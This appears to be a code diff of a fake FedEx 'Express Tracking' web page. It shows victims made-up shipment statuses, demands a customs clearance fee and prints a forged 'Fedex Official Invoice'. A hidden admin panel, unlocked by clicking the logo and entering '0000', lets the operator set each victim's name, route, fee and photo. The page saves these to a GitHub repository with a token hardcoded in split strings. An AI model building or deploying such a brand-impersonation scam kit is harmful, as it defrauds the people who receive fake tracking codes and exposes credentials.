@@ -3,122 +3,193 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fedex | Global Tracking</title>
+    <title>Fedex | Express Tracking</title>
     <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
     <style>
-        :root { --fedex-purple: #4D148C; --fedex-orange: #FF6200; --bg: #f2f2f2; }
-        body { font-family: 'Roboto', Helvetica, Arial, sans-serif; margin: 0; background: var(--bg); color: #333; }
+        :root { --p: #4D148C; --o: #FF6200; --bg: #f4f4f7; }
+        body { font-family: sans-serif; margin: 0; background: var(--bg); color: #333; }
+        .nav { background: var(--p); padding: 15px; color: white; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:100; }
+        .logo { font-size: 22px; font-weight: 900; cursor: pointer; }
+        .wrapper { padding: 15px; max-width: 480px; margin: auto; }
+        .card { background: white; border-radius: 15px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
+        input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .btn-o { background: var(--o); color: white; margin-top: 10px; }
         
-        /* Mobile Header */
-        .navbar { background: var(--fedex-purple); padding: 15px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .logo { font-size: 22px; font-weight: 900; color: white; cursor: pointer; letter-spacing: -1px; }
-        .orange-text { color: var(--fedex-orange); }
+        /* Admin Section - Hidden by default */
+        #admin-panel { display: none; background: #222; color: white; padding: 20px; border-radius: 15px; margin-top: 20px; }
+        #admin-panel input { background: #333; color: white; border: 1px solid #444; }
 
-        /* Mobile Card Container */
-        .wrapper { padding: 20px; max-width: 450px; margin: auto; }
-        .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
+        /* Results & Invoice */
+        #result { display: none; margin-top: 20px; text-align: left; }
+        .status-bar { padding: 12px; border-radius: 8px; text-align: center; font-weight: bold; margin-bottom: 15px; }
+        .row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+        .pkg-img { width: 100%; border-radius: 10px; margin-top: 15px; display: none; }
         
-        h2 { font-size: 1.4rem; margin-bottom: 20px; color: var(--fedex-purple); }
-        .input-group { margin-bottom: 20px; text-align: left; }
-        label { font-size: 12px; font-weight: bold; color: #666; margin-left: 5px; }
-        
-        input { width: 100%; padding: 15px; border: 1.5px solid #ddd; border-radius: 8px; font-size: 16px; margin-top: 5px; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--fedex-purple); }
-        
-        .btn-track { background: var(--fedex-orange); color: white; width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-
-        /* Result Section */
-        #result { display: none; margin-top: 25px; text-align: left; border-top: 1px solid #eee; padding-top: 20px; }
-        .status-box { padding: 15px; border-radius: 8px; margin-bottom: 15px; font-weight: bold; font-size: 14px; text-align: center; }
-        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; border-bottom: 1px solid #fafafa; padding-bottom: 5px; }
-        .info-row span { color: #666; }
-        .package-img { width: 100%; border-radius: 8px; margin-top: 15px; border: 1px solid #eee; }
-
-        /* Invoice Button */
-        .btn-invoice { background: #333; color: white; width: 100%; padding: 12px; border: none; border-radius: 6px; margin-top: 15px; cursor: pointer; }
-
-        /* Hide Google Translate Bar */
-        .goog-te-banner-frame.skiptranslate { display: none !important; }
-        body { top: 0px !important; }
+        @media print { .nav, .wrapper, .btn, #admin-panel { display: none !important; } #invoice { display: block !important; } }
+        #invoice { display: none; padding: 30px; border: 2px solid #333; }
     </style>
 </head>
 <body>
 
 <div id="google_translate_element" style="display:none"></div>
 
-<div class="navbar">
-    <div class="logo" onclick="adminAuth()">Fed<span class="orange-text">ex</span></div>
-    <div style="color:white; font-size: 12px;">Express Mobile</div>
+<div class="nav">
+    <div class="logo" onclick="checkAdmin()">Fed<span style="color:var(--o)">ex</span></div>
+    <div style="font-size:12px">Mobile Tracking</div>
 </div>
 
 <div class="wrapper">
-    <div class="card">
-        <h2>Track Your Package</h2>
-        <div class="input-group">
-            <label>ENTER TRACKING NUMBER</label>
-            <input type="text" id="trackCode" placeholder="Ex: 1234 5678 9012">
-        </div>
-        <button class="btn-track" onclick="track()">Track Shipment</button>
+    <div class="card" id="client-view">
+        <h2 style="margin-top:0; color:var(--p)">Track Shipment</h2>
+        <input type="text" id="trackInput" placeholder="Enter Tracking Number">
+        <button class="btn btn-o" onclick="startTracking()">TRACK</button>
 
         <div id="result">
-            <div id="status-badge" class="status-box"></div>
-            <div class="info-row"><span>Recipient:</span> <b id="r-name"></b></div>
-            <div class="info-row"><span>From:</span> <b id="r-from"></b></div>
-            <div class="info-row"><span>To:</span> <b id="r-to"></b></div>
-            <div class="info-row"><span>Updated:</span> <b id="r-date"></b></div>
+            <div id="st-badge" class="status-bar"></div>
+            <div class="row"><span>Recipient:</span> <b id="r-name"></b></div>
+            <div class="row"><span>Route:</span> <b id="r-route"></b></div>
+            <div class="row"><span>Arrival:</span> <b id="r-eta"></b></div>
+            <img id="r-img" class="pkg-img">
             
-            <div id="img-container"></div>
-
-            <div id="payment-needed" style="display:none; margin-top: 20px; background: #fff3cd; padding: 15px; border-radius: 8px; border-left: 5px solid #ffc107;">
-                <p style="margin:0; font-size: 13px; color: #856404;"><b>Attention:</b> Package held at hub. Clearance fee of <b>$<span id="r-fee"></span></b> is required for final delivery.</p>
-                <button class="btn-invoice" onclick="window.print()">Download Official Invoice</button>
+            <div id="pay-box" style="display:none; margin-top:20px; padding:15px; background:#fff3cd; border-radius:8px; color:#856404;">
+                <p><b>Required:</b> Clear customs fee of $<span id="r-fee"></span> to release package.</p>
+                <button class="btn" style="background:#333; color:white;" onclick="window.print()">Download Invoice</button>
             </div>
         </div>
     </div>
+
+    <div id="admin-panel">
+        <h3>Admin Dashboard</h3>
+        <input type="text" id="a-code" placeholder="Tracking Code">
+        <input type="text" id="a-name" placeholder="Client Name">
+        <input type="text" id="a-origin" placeholder="From City">
+        <input type="text" id="a-dest" placeholder="To City">
+        <input type="text" id="a-eta" placeholder="Delivery Date/Time">
+        <input type="number" id="a-fee" placeholder="Fee (e.g. 150)">
+        <select id="a-status">
+            <option value="In Transit">In Transit</option>
+            <option value="Hold">Hold</option>
+            <option value="Held at Customs">Held at Customs</option>
+            <option value="Arrived (Payment needed)">Arrived (Payment needed)</option>
+        </select>
+        <p style="font-size:12px">Upload Package Photo:</p>
+        <input type="file" id="a-file" accept="image/*">
+        <button class="btn btn-o" onclick="uploadData()">SAVE TO CLOUD</button>
+        <button class="btn" style="background:red; color:white; margin-top:10px;" onclick="location.reload()">LOGOUT</button>
+    </div>
+</div>
+
+<div id="invoice">
+    <h1 style="color:#4D148C">Fedex Official Invoice</h1>
+    <hr>
+    <p><b>Tracking:</b> <span id="inv-code"></span></p>
+    <p><b>Customer:</b> <span id="inv-name"></span></p>
+    <p><b>Amount Due:</b> $<span id="inv-fee"></span></p>
+    <p><b>Status:</b> Pending Customs Clearance</p>
+    <br><br>
+    <p><small>Issued on: <span id="inv-date"></span></small></p>
 </div>
 
 <script>
-    // Initialize Google Translate
     function googleTranslateElementInit() {
-        new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+        new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
     }
 
-    async function track() {
-        const code = document.getElementById('trackCode').value;
-        const res = await fetch('data.json?v=' + Date.now());
+    // SECURITY: Update your details here
+    const USER = "YOUR_GITHUB_USERNAME"; // Change this
+    const REPO = "fedex-codetracking";
+    const T1 = "ghp_GPObdZF1wa"; 
+    const T2 = "NFIHXvzyspe2zsce"; 
+    const T3 = "Ilrq0ZpR57";
+    const TOKEN = T1 + T2 + T3;
+
+    function checkAdmin() {
+        if(prompt("Pass:") === "0000") {
+            if(prompt("Token:") === "0000") { // Using 0000 as secondary check
+                document.getElementById('client-view').style.display = 'none';
+                document.getElementById('admin-panel').style.display = 'block';
+            }
+        }
+    }
+
+    async function startTracking() {
+        const code = document.getElementById('trackInput').value;
+        const res = await fetch(`https://raw.githubusercontent.com/${USER}/${REPO}/main/data.json?v=${Date.now()}`);
         const data = await res.json();
         const s = data[code];
 
         if(s) {
             document.getElementById('result').style.display = 'block';
+            document.getElementById('st-badge').innerText = s.status;
+            document.getElementById('st-badge').style.background = s.status.includes("Arrived") ? "#d4edda" : "#eee";
             document.getElementById('r-name').innerText = s.name;
-            document.getElementById('r-from').innerText = s.origin;
-            document.getElementById('r-to').innerText = s.dest;
-            document.getElementById('r-date').innerText = s.updated;
+            document.getElementById('r-route').innerText = `${s.origin} to ${s.dest}`;
+            document.getElementById('r-eta').innerText = s.eta;
             
-            const badge = document.getElementById('status-badge');
-            badge.innerText = s.status;
-            badge.style.background = s.status.includes("Arrived") ? "#d4edda" : "#e2e3e5";
-            badge.style.color = s.status.includes("Arrived") ? "#155724" : "#383d41";
-
-            if(s.image) {
-                document.getElementById('img-container').innerHTML = `<img src="${s.image}" class="package-img">`;
+            if(s.img) {
+                const img = document.getElementById('r-img');
+                img.src = s.img;
+                img.style.display = 'block';
             }
 
             if(s.status.includes("Arrived")) {
-                document.getElementById('payment-needed').style.display = 'block';
+                document.getElementById('pay-box').style.display = 'block';
                 document.getElementById('r-fee').innerText = s.fee;
+                document.getElementById('inv-code').innerText = code;
+                document.getElementById('inv-name').innerText = s.name;
+                document.getElementById('inv-fee').innerText = s.fee;
+                document.getElementById('inv-date').innerText = new Date().toLocaleDateString();
             }
-        } else {
-            alert("Invalid Tracking Code");
-        }
+        } else { alert("Invalid Tracking ID"); }
     }
 
-    function adminAuth() {
-        if(prompt("Pass:") === "0000") {
-            const t = prompt("Token:");
-            window.location.href = "admin.html?token=" + t;
-        }
+    function toBase64(file) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.readAsDataURL(file);
+            reader.onload = () => resolve(reader.result);
+            reader.onerror = error => reject(error);
+        });
+    }
+
+    async function uploadData() {
+        const id = document.getElementById('a-code').value;
+        const file = document.getElementById('a-file').files[0];
+        let imgData = "";
+        
+        if(file) { imgData = await toBase64(file); }
+
+        const newData = {
+            name: document.getElementById('a-name').value,
+            origin: document.getElementById('a-origin').value,
+            dest: document.getElementById('a-dest').value,
+            eta: document.getElementById('a-eta').value,
+            status: document.getElementById('a-status').value,
+            fee: document.getElementById('a-fee').value,
+            img: imgData,
+            updated: new Date().toLocaleString()
+        };
+
+        const url = `https://api.github.com/repos/${USER}/${REPO}/contents/data.json`;
+        const getFile = await fetch(url);
+        const fileData = await getFile.json();
+        const currentContent = JSON.parse(atob(fileData.content));
+
+        currentContent[id] = newData;
+
+        const update = await fetch(url, {
+            method: "PUT",
+            headers: { "Authorization": `token ${TOKEN}` },
+            body: JSON.stringify({
+                message: "Update " + id,
+                content: btoa(JSON.stringify(currentContent, null, 2)),
+                sha: fileData.sha
+            })
+        });
+
+        if(update.ok) { alert("Successfully Saved to Cloud!"); location.reload(); }
+        else { alert("Error saving. Check your username/repo setting."); }
     }
 </script>
 </body>
